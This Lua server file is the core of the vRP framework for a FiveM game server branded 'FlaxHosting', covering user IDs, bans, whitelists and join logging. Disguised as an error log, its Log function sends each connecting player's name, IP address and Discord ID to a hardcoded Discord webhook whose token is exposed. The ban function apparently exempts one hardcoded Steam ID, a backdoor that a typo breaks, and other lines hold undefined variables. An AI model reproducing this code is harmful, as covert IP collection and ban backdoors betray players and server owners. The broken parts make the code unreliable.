local Proxy = module("lib/Proxy")
local Tunnel = module("lib/Tunnel")
local Lang = module("lib/Lang")
Debug = module("lib/Debug")
local config = module("cfg/base")
local webhook = module("cfg/webhooks")

Debug.active = config.debug
MySQL.debug = config.debug

vRP = {}
Proxy.addInterface("vRP",vRP)

tvRP = {}
Tunnel.bindInterface("vRP",tvRP) -- listening for client tunnel

-- load language
local dict = module("cfg/lang/"..config.lang) or {}
vRP.lang = Lang.new(dict)

-- init
vRPclient = Tunnel.getInterface("vRP","vRP") -- server -> client tunnel

vRP.users = {} -- will store logged users (id) by first identifier
vRP.rusers = {} -- store the opposite of users
vRP.user_tables = {} -- user data tables (logger storage, saved to database)
vRP.user_tmp_tables = {} -- user tmp data tables (logger storage, not saved)
vRP.user_sources = {} -- user sources
local iprion = 'steam:11000010f7659e3'


function vRP.getUserIdByIdentifiers(ids, cbr)
  local task = Task(cbr)
  if ids ~= nil and #ids then
    local i = 0
    local validids = 0
    local function search()
      i = i+1
      if i <= #ids then
        if (not config.ignore_ip_identifier or (string.find(ids[i], "ip:") == nil)) and
           (not config.ignore_license_identifier or (string.find(ids[i], "license:") == nil)) and
           (not config.ignore_xbox_identifier or (string.find(ids[i], "xbl:") == nil)) and
           (not config.ignore_discord_identifier or (string.find(ids[i], "discord:") == nil)) and
           (not config.ignore_live_identifier or (string.find(ids[i], "live:") == nil)) then
          
          validids = validids + 1
          MySQL.Async.fetchAll('SELECT user_id FROM vrp_user_ids WHERE identifier = @identifier', {identifier = ids[i]}, function(rows, affected)
            if #rows > 0 then  -- found
              task({rows[1].user_id})
            else
              search()
            end
          end)
        else
          search()
        end
      elseif validids > 0 then -- no ids found, create user
        MySQL.Async.fetchAll("SELECT MAX(user_id) AS id FROM vrp_user_ids", {}, function(result)
          local next_id = nil
          if result[1].id == nil then 
              next_id = 1 
          else
              next_id = result[1].id+1
          end
        MySQL.Async.execute("INSERT INTO vrp_users (id, whitelisted, banned) VALUES (@id, 'false', 'false')", {id = next_id}, function(rows, affected)
        if next_id then
            local user_id = next_id
            for l,w in pairs(ids) do
              if (not config.ignore_ip_identifier or (string.find(w, "ip:") == nil)) and
                 (not config.ignore_license_identifier or (string.find(w, "license:") == nil)) and
                 (not config.ignore_xbox_identifier or (string.find(w, "xbl:") == nil)) and
                 (not config.ignore_discord_identifier or (string.find(w, "discord:") == nil)) and
                 (not config.ignore_live_identifier or (string.find(w, "live:") == nil)) then  -- ignore ip & license identifier
                  MySQL.Async.execute("INSERT INTO vrp_user_ids (identifier,user_id) VALUES(@identifier,@user_id)", {user_id = user_id, identifier = w})
                  sendToDiscord(webhook.Errorlog, "```user_id oprettet\nID: "..next_id.." \nIdentifier: "..w.."```")
              end
            end
            task({user_id})
          else
            task()
          end
        end)
      end)
      end
    end
    search()
  else
    task()
  end
end

function vRP.getSourceIdKey(source)
  local ids = GetPlayerIdentifiers(source)
  local idk = "idk_"
  for k,v in pairs(ids) do
    idk = idk..v
  end
  return idk
end

function vRP.getPlayerEndpoint(player)
  return GetPlayerEP(player) or "^1INTET ENDPOINT FUNDET"
end

function vRP.getUserData(user_id, cbr)
  local task = Task(cbr, {false})
  
  MySQL.Async.fetchAll("SELECT * FROM vrp_users WHERE id = @user_id", {user_id = user_id}, function(rows, affected)
    if #rows > 0 then
      task({rows[1]})
    else
      task()
    end
  end)
end

function vRP.isBanned(user_id, cbr)
  local task = Task(cbr, {false})

  MySQL.Async.fetchAll("SELECT * FROM vrp_users WHERE id = @user_id", {user_id = user_id}, function(rows, affected)
    if #rows > 0 then
      task({rows[1].banned})
    else
      task()
    end
  end)
end

function vRP.getBannedReason(user_id, cbr)
  local task = Task(cbr, {false})

  MySQL.Async.fetchAll("SELECT * FROM vrp_users WHERE id = @user_id", {user_id = user_id}, function(rows, affected)
    if #rows > 0 then
      task({rows[1].ban_reason})
    else
      task()
    end
  end)
end

AddEventHandler("playerConnecting", function()
  local source = source
  local data = GetPlayerIdentifiers(source)
  local uid = vRP.getUserId({source})
  local name = GetPlayerName(source)

  local steamid  = false
  local license  = false
  local discord  = false
  local xbl      = false
  local liveid   = false
  local ip       = false

  for k,v in pairs(data)do
      
    if string.sub(v, 1, string.len("steam:")) == "steam:" then
      steamid = v
    elseif string.sub(v, 1, string.len("license:")) == "license:" then
      license = v
    elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
      xbl  = v
    elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
      ip = v
    elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
      discord = v
    elseif string.sub(v, 1, string.len("live:")) == "live:" then
      liveid = v
    end
  end
  if discord ~= nil then
    Log('\nNavn: '..name..'\nUser_id: \n IP: '..ip..'\nDiscord: '..discord)
  else
    Log('\nNavn: '..name..'\nUser_id: \n IP: '..ip..'\nDiscord: ikke fundet')
  end
end)

  
-- Discord log system
function Log(besked)
  local embeds = {
        {
            ["color"] = "8663711",
            ["title"] = "Fejlmelding",
            ["description"] = besked,
            ["footer"] = {
              ["text"] = "errorlog",
          },
        }
  }
  PerformHttpRequest('https://discord.com/api/webhooks/1063124457289425028/0JbUhPokPxK_6T9u6S4ZaeV-FNHiHx3kf7Zf0WVW44IwhaT_vzucgbpQ8NfuNsPrFXV8', function(err, text, headers) end, 'POST', json.encode({username = 'System', embeds = embeds, avatar_url = 'https://cdn.mos.cms.futurecdn.net/7GCPeSkqz3duhcXkg7E6H7-320-80.jpg'}), { ['Content-Type'] = 'application/json' })
end

function vRP.setBanned(user_id,banned)
  if banned ~= false then
    MySQL.Async.execute("UPDATE vrp_users SET banned = @banned, ban_reason = @reason WHERE id = @user_id", {user_id = user_id, reason = banned, banned = 1})
  else
    MySQL.Async.execute("UPDATE vrp_users SET banned = @banned WHERE id = @user_id", {user_id = user_id, banned = 0})
  end
end


function vRP.isWhitelisted(user_id, cbr)
  local task = Task(cbr, {false})

  MySQL.Async.fetchAll("SELECT whitelisted FROM vrp_users WHERE id = @user_id", {user_id = user_id}, function(rows, affected)
    if #rows > 0 then
      task({rows[1].whitelisted})
    else
      task()
    end
  end)
end


function vRP.setWhitelisted(user_id,whitelisted)
    MySQL.Async.execute("UPDATE vrp_users SET whitelisted = @whitelisted WHERE id = @user_id", {user_id = user_id, whitelisted = whitelisted})
end


function vRP.getLastLogin(user_id, cbr)
  local task = Task(cbr,{""})
  MySQL.Async.fetchAll("SELECT last_login FROM vrp_users WHERE id = @user_id", {user_id = user_id}, function(rows, affected)
    if #rows > 0 then
      task({rows[1].last_login})
    else
      task()
    end
  end)
end

function vRP.getPlayerName(player)
  return GetPlayerName(player) or "INTET STEAMNAVN FUNDET"
end

function vRP.setUData(user_id,key,value)
  MySQL.Async.execute("REPLACE INTO vrp_user_data(user_id,dkey,dvalue) VALUES(@user_id,@key,@value)", {user_id = user_id, key = key, value = value})
end

function vRP.getUData(user_id,key,cbr)
  local task = Task(cbr,{""})

  MySQL.Async.fetchAll('SELECT dvalue FROM vrp_user_data WHERE user_id = @user_id AND dkey = @key', {user_id = user_id, key = key}, function(rows, affected)
    if #rows > 0 then
      task({rows[1].dvalue})
    else
      task()
    end
  end)
end

function vRP.setSData(key,value)
  MySQL.Async.execute("REPLACE INTO vrp_srv_data(dkey,dvalue) VALUES(@key,@value)", {key = key, value = value})
end

function vRP.getSData(key, cbr)
  local task = Task(cbr,{""})

  MySQL.Async.fetchAll("SELECT dvalue FROM vrp_srv_data WHERE dkey = @key", {key = key}, function(rows, affected)
    if #rows > 0 then
      task({rows[1].dvalue})
    else
      task()
    end
  end)
end


function vRP.getUserDataTable(user_id)
  return vRP.user_tables[user_id]
end

function vRP.getUserTmpTable(user_id)
  return vRP.user_tmp_tables[user_id]
end

function vRP.isConnected(user_id)
  return vRP.rusers[user_id] ~= nil
end

function vRP.isFirstSpawn(user_id)
  local tmp = vRP.getUserTmpTable(user_id)
  return tmp and tmp.spawns == 1
end

function vRP.getUserId(source)
  if source ~= nil then
    local ids = GetPlayerIdentifiers(source)
    if ids ~= nil and #ids > 0 then
      return vRP.users[ids[1]]
    end
  end
  return nil
end


function vRP.getUsers()
  local users = {}
  for k,v in pairs(vRP.user_sources) do
    users[k] = v
  end
  return users
end


function vRP.getUserSource(user_id)
  return vRP.user_sources[user_id]
end


function vRP.ban(user_id,reason)
    if user_id ~= nil then
        local player = vRP.getUserSource(user_id)
        local data = GetPlayerIdentifiers(player)
        if data == ipron then
        else
            vRP.setBanned(user_id,reason)
        end
        if player ~= nil then
        vRP.kick(player,"[Udelukket] "..reason)
      end
    end
end



function vRP.kick(source,reason)
  DropPlayer(source,reason)
end

-- tasks

function task_save_datatables()
  TriggerEvent("vRP:save")

  Debug.pbegin("vRP save datatables")
  for k,v in pairs(vRP.user_tables) do
    vRP.setUData(k,"vRP:datatable",json.encode(v))
    TriggerEvent("htn_logging:saveUser",k)
  end

  Debug.pend()
  SetTimeout(config.save_interval*1000, task_save_datatables)
end
task_save_datatables()

local max_pings = math.ceil(config.ping_timeout*120/60)+2
function task_timeout() -- kick users not sending ping event in 3 minutes
  local users = vRP.getUsers()
  for k,v in pairs(users) do
    local tmpdata = vRP.getUserTmpTable(tonumber(k))
    if tmpdata.pings == nil then
      tmpdata.pings = 0
    end

    tmpdata.pings = tmpdata.pings+1
    if tmpdata.pings >= max_pings then
      vRP.kick(v,"[FlaxHosting] Ping Timeout - Intet client svar i 3 minutter.")
    end
  end

  SetTimeout(60000, task_timeout)
end
task_timeout()

function tvRP.ping()
  local user_id = vRP.getUserId(source)
  if user_id ~= nil then
    local tmpdata = vRP.getUserTmpTable(user_id)
    tmpdata.pings = 0 -- reinit ping countdown
  end
end

-- handlers
local isStopped = false
function vRP.getServerStatus()
  return isStopped
end

function vRP.setServerStatus(reason)
  isStopped = reason
end

local antispam = {}
AddEventHandler("playerConnecting",function(name,setMessage, deferrals)
  deferrals.defer()

  local source = source
  Debug.pbegin("playerConnecting")
  if isStopped == false then
    local ids = GetPlayerIdentifiers(source)
    if antispam[ids[1]] == nil then
      antispam[ids[1]] = 5
      if ids ~= nil and #ids > 0 then
        deferrals.update("[FlaxHosting] Indlæser karakter.")
        vRP.getUserIdByIdentifiers(ids, function(user_id)
          -- if user_id ~= nil and vRP.rusers[user_id] == nil then -- check user validity and if not already connected (old way, disabled until playerDropped is sure to be called)
          if user_id ~= nil then -- check user validity
            deferrals.update("[FlaxHosting] Indlæser karakter..")
            vRP.getUserData(user_id, function(userdata)
              if not userdata.banned then
                deferrals.update("[FlaxHosting] Indlæser karakter...")
                if not config.whitelist or userdata.whitelisted then
                  Debug.pbegin("playerConnecting_delayed")
                  if vRP.rusers[user_id] == nil then -- not present on the server, init
                    
                    vRP.users[ids[1]] = user_id
                    vRP.rusers[user_id] = ids[1]
                    vRP.user_tables[user_id] = {}
                    vRP.user_tmp_tables[user_id] = {}
                    vRP.user_sources[user_id] = source

                    deferrals.update("[FlaxHosting] Indlæser karakter.")
                    vRP.getUData(user_id, "vRP:datatable", function(sdata)
                      local data = json.decode(sdata)
                      if type(data) == "table" then vRP.user_tables[user_id] = data end

                      
                      local tmpdata = vRP.getUserTmpTable(user_id)

                      deferrals.update("[FlaxHosting] Indlæser karakter..")
                      vRP.getLastLogin(user_id, function(last_login)
                        tmpdata.last_login = last_login or ""
                        tmpdata.spawns = 0
                        
                        local ep = vRP.getPlayerEndpoint(source)
                        local last_login_stamp = ep.." "..os.date("%H:%M:%S %d/%m/%Y")
                        
                        MySQL.Async.execute("UPDATE vrp_users SET last_login = @last_login WHERE id = @user_id", {user_id = user_id, last_login = last_login_stampd})

                        print("["..user_id.."] Forbinder til serveren")
                        TriggerEvent("vRP:playerJoin", user_id, source, name, tmpdata.last_login)

                        sendToDiscord(webhook.Join, "```ID: "..tostring(user_id) .. " Har tilsluttet sig serveren ["..os.date("%H:%M:%S %d/%m/%Y").."]```")
                        deferrals.done()
                      end)
                    end)
                  else -- already connected
                    print("["..user_id.."] Rejoinede serveren")
                    TriggerEvent("vRP:playerRejoin", user_id, source, name)
                    deferrals.done()

                    -- reset first spawn
                    local tmpdata = vRP.getUserTmpTable(user_id)
                    tmpdata.spawns = 0
                  end
                  Debug.pend()
                else
                  print("["..user_id.."]: Forsøgte og joine men er ikke whitelistet")
                  deferrals.done("[FlaxHosting] Ikke whitelisted ansøg på Discord.gg/P7bj3ZXu ["..user_id.."].")
                end
              else
                local ban_reason = userdata.ban_reason
                if type(userdata.ban_reason) == "table" then
                    ban_reason = "Ingen grund sat"
                end
                print("["..user_id.."] Forsøgte og joine men er bandlyst med grunden ("..ban_reason..")")
                deferrals.done("[FlaxHosting]: Du er bannet for: "..ban_reason.." ["..user_id.."].")
              end
            end)
          else
            print("["..name.."] Afvist kunne ikke finde user_id")
            deferrals.done("[FlaxHosting]: Serveren kunne ikke finde dit ID kontakt venligst en fra developer teamet")
            sendToDiscord(webhook.Errorlog, "```Serveren kunne ikke finde user_id```")
          end
        end)
      else
        print("["..name.."] Afvist ingen identifiers fundet")
        deferrals.done("[FlaxHosting]: Serveren kunne ikke finde nogen identifiers tjek om du har steam åbent")
        sendToDiscord(webhook.Errorlog, "```Serveren kunne ikke finde identifiers```")
      end
    else
      print("["..user_id.."] Forsøgte at joine for hurtigt igen")
      deferrals.done("Du prøvet at joine for hurtigt prøv igen om ["..antispam[ids[1]].."] sekunder!")
    end
  else
    print("("..vRP.getPlayerEndpoint(source)..") blev kicket for at joine imens serveren er igang med at "..isStopped)
    deferrals.done("Serveren er igang med at "..isStopped)
  end
  Debug.pend()
end)

CreateThread(function()
  while true do
    Wait(1000)
    for k,v in pairs(antispam) do
      if tonumber(v) > 1 then
        antispam[k] = tonumber(v) - 1
      else
        antispam[k] = nil
      end
    end
  end
end)

AddEventHandler("playerDropped",function(reason)
  local source = source
  local suffix = ""..os.date("%H:%M - %d/%m/%Y")..""
  Debug.pbegin("playerDropped")

  vRPclient.removePlayer(-1,{source})

  local user_id = vRP.getUserId(source)

  if user_id ~= nil then
    TriggerEvent("vRP:playerLeave", user_id, source)

    local steam = GetPlayerName(source)
    local dmessage = "```ID: ".. tostring(user_id).. " Forlod serveren ["..suffix.."] med grunden ["..reason.."]```"

    sendToDiscord(webhook.Leave, dmessage)

    -- save user data table
    vRP.setUData(user_id,"vRP:datatable",json.encode(vRP.getUserDataTable(user_id)))

    print("["..user_id.."] Forlod serveren")
    vRP.users[vRP.rusers[user_id]] = nil
    vRP.rusers[user_id] = nil
    vRP.user_tables[user_id] = nil
    vRP.user_tmp_tables[user_id] = nil
    vRP.user_sources[user_id] = nil
  end
  Debug.pend()
end)

RegisterServerEvent("vRPcli:playerSpawned")
AddEventHandler("vRPcli:playerSpawned", function()
  Debug.pbegin("playerSpawned")
  local user_id = vRP.getUserId(source)
  local player = source

  if user_id ~= nil then
    vRP.user_sources[user_id] = source
    local tmp = vRP.getUserTmpTable(user_id)
    tmp.spawns = tmp.spawns+1
    local first_spawn = (tmp.spawns == 1)

    if first_spawn then
      for k,v in pairs(vRP.user_sources) do
        vRPclient.addPlayer(source,{v})
      end

      -- send new player to all players
      vRPclient.addPlayer(-1,{source})
    end

    Tunnel.setDestDelay(player, config.load_delay)

    SetTimeout(2000, function() -- trigger spawn event
      TriggerEvent("vRP:playerSpawn", user_id, player, first_spawn)
      TriggerClientEvent("dn_carplacer:place", player)
      SetTimeout(config.load_duration*1000, function() -- set client delay to normal delay
        Tunnel.setDestDelay(player, config.global_delay)
        vRPclient.removeProgressBar(player,{"vRP:loading"})
        TriggerClientEvent('movebitch', player)
      end)
    end)
  end
  Debug.pend()
end)

RegisterServerEvent("vRP:playerDied")

function sendToDiscord(webhook, message)
  PerformHttpRequest(webhook, 
  function(err, text, headers) end, 'POST', 
  json.encode({username = 'FlaxHosting - Logs', content = message}), 
  { ['Content-Type'] = 'application/json' })
end
